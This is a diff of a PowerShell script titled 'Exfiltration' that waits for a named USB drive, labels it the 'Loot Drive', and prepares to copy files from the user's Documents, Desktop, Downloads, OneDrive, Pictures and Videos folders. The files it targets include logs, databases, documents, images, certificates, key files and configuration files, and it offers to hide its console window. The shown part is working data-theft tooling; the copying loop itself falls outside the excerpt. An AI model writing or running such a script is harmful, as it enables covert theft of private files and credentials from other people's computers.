@@ -1,20 +1,24 @@
-
 [Console]::BackgroundColor = "Black"
 [Console]::SetWindowSize(57, 5)
 [Console]::Title = "Exfiltration"
 Clear-Host
 
-$hidden = Read-Host "Would you like to hide this console window? (Y/N)"
-$removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
-$count = $removableDrives.count
+if($driveName.length -lt 1){
+    $driveName = Read-Host "Enter the name of the USB drive "
+}
+
+if($hidden.length -lt 1){
+    $hidden = Read-Host "Would you like to hide this console window? (Y/N) "
+}
+
 $i = 10
 
 While ($true){
     cls
-    Write-Host "Connect a Device.. ($i)" -ForegroundColor Yellow
-    $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
+    Write-Host "Waiting for USB Drive.. ($i)" -ForegroundColor Yellow
+    $drive = Get-WMIObject Win32_LogicalDisk | ? {$_.VolumeName -eq $driveName} | select DeviceID
     sleep 1
-    if (!($count -eq $removableDrives.count)){
+    if ($drive.length -ne 0){
         Write-Host "USB Drive Connected!" -ForegroundColor Green
         break
     }
@@ -28,12 +32,12 @@ While ($true){
 
 [Console]::SetWindowSize(80, 30)
 
-$drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object -Descending | Select-Object -First 1
-$driveLetter = $drive.DeviceID
+$drive = Get-WMIObject Win32_LogicalDisk | ? {$_.VolumeName -eq $driveName}
+$driveletter = $drive.DeviceID
 Write-Host "Loot Drive Set To : $driveLetter/" -ForegroundColor Green
 $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
 $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")  
-$destinationPath = "$driveLetter\$env:COMPUTERNAME`_Loot"
+$destinationPath = "$driveLetter\$env:COMPUTERNAME-Loot"
 
 if (-not (Test-Path -Path $destinationPath)) {
     New-Item -ItemType Directory -Path $destinationPath -Force
